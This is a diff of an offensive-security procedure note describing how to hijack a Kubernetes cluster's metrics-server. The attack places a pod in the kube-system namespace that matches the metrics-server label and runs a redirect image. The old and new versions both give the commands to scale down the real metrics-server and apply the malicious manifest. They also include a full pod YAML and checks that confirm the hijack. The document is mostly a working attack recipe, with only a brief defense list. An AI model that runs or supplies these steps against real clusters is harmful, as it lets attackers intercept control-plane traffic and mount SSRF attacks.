@@ -1,15 +1,15 @@
 ---
-id: proc-deploy-hijacker-pod-001
 tags:
-  - ssrf
   - kubernetes
-  - pod-hijack
+  - hijack
+  - pod
 type: procedure
 tools:
   - '[[tools/kubectl]]'
 tactics:
   - '[[Initial Access]]'
-commands: []
+commands:
+  - '[[commands/kubectl-apply]]'
 verified: false
 platforms:
   - Kubernetes
@@ -17,8 +17,12 @@ submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[Exploit Public-Facing Application]]'
-updated_at: '2025-12-14T03:46:08.950Z'
+updated_at: '2025-12-14T17:32:38.981Z'
+skill_level: intermediate
+impact_level: high
+detection_risk: high
 sub_techniques: []
+id: 22046290-9c10-467a-aa4e-10af396f596f
 validated: true
 mitre_tactics:
   - '[[Initial Access]]'
@@ -29,65 +33,69 @@ mitre_techniques:
 
 ## Summary
 
-Deploys a malicious pod in the kube-system namespace using the same label selector as metrics-server (k8s-app=metrics-server) to intercept and hijack API requests, enabling SSRF redirects.
+Deploys a malicious pod in the kube-system namespace using the same label selector as metrics-server, allowing it to intercept and hijack service traffic for SSRF exploitation.
 
 ## Description
 
-Aggregated API servers in Kubernetes select pods based on labels; by deploying a pod with matching labels, the malicious one can be prioritized or replace the legitimate metrics-server. This causes clients like kube-controller-manager to send requests to the hijacker, which redirects them externally. Scale down the original deployment if replicas conflict. Requires kubectl access to kube-system.
+This targets aggregated API servers in Kubernetes by deploying a pod that matches the selector (e.g., k8s-app=metrics-server), causing the service to route requests to the attacker-controlled pod. Requires cluster access and YAML manifest (go-redirect.yaml) defining the pod with the image and labels. Outcomes include traffic redirection without altering core Kubernetes configs.
 
 ## Requirements
 
-1. kubectl configured with cluster-admin RBAC
-2. Malicious image available (e.g., docker.io/weinong/go-redirect)
-3. go-redirect.yaml manifest defining pod with matching labels
+1. kubectl access to kube-system
+2. Malicious Docker image pushed or local
+3. go-redirect.yaml with matching labels
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Use admission controllers to block unauthorized deployments in kube-system
-- Implement label validation and pod security policies
-- Audit deployments for label overlaps with critical services
+- Restrict deployments in kube-system namespace
+- Validate pod labels and selectors
+- Audit service endpoint changes
 
 ## Objectives
 
-1. Intercept requests to metrics-server API endpoints
-2. Position hijacker for SSRF exploitation
-3. Minimize detection by mimicking legitimate pod
+1. Hijack metrics-server service endpoints
+2. Intercept API requests from control plane
+3. Enable redirect-based SSRF
 
 ## Instructions
 
-### Step 1: Scale Down Original Metrics-Server
+### Step 1: Prepare YAML Manifest
 
-**Context**: Prevent conflicts by reducing replicas of the legitimate deployment.
+**Context**: Create go-redirect.yaml specifying the pod with labels k8s-app=metrics-server and image weinong/go-redirect.
 
-Use [[tools/kubectl]]:
+No command; YAML example:
 
-```bash
-kubectl scale deployment metrics-server --replicas=0 -n kube-system
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: malicious-metrics
+  namespace: kube-system
+  labels:
+    k8s-app: metrics-server
+spec:
+  containers:
+  - name: redirect
+    image: weinong/go-redirect
+    ports:
+    - containerPort: 8080
 ```
 
-> Scales down; verify with `kubectl get deployments -n kube-system` showing replicas=0.
+> Ensures selector match for hijacking.
 
-### Step 2: Apply Malicious Deployment
+### Step 2: Apply Deployment
 
-**Context**: Deploy the hijacker using go-redirect.yaml with labels k8s-app=metrics-server.
+**Context**: Use kubectl to deploy the pod, updating service endpoints.
 
-```bash
-kubectl apply -f go-redirect.yaml -n kube-system
-```
-
-> Deploys pod; check status with `kubectl get pods -n kube-system -l k8s-app=metrics-server`.
-
-### Step 3: Verify Hijack
-
-**Context**: Confirm the malicious pod is selected by API aggregations.
+**Command** ([[commands/kubectl-apply]]):
 
 ```bash
-kubectl get endpoints -n kube-system metrics-server
+kubectl apply -f go-redirect.yaml
 ```
 
-> Shows malicious pod IP as endpoint.
+> Deploys pod; expected output: pod/malicious-metrics created.
 
 ## MITRE ATT&CK Mapping
 
@@ -104,6 +112,7 @@ kubectl get endpoints -n kube-system metrics-server
 
 ## Commands Used
 
+- [[commands/kubectl-apply]]
 
 ## Tools Used
 
@@ -111,6 +120,6 @@ kubectl get endpoints -n kube-system metrics-server
 
 ## Tags
 
-- ssrf
 - kubernetes
-- pod-hijack
+- hijack
+- pod
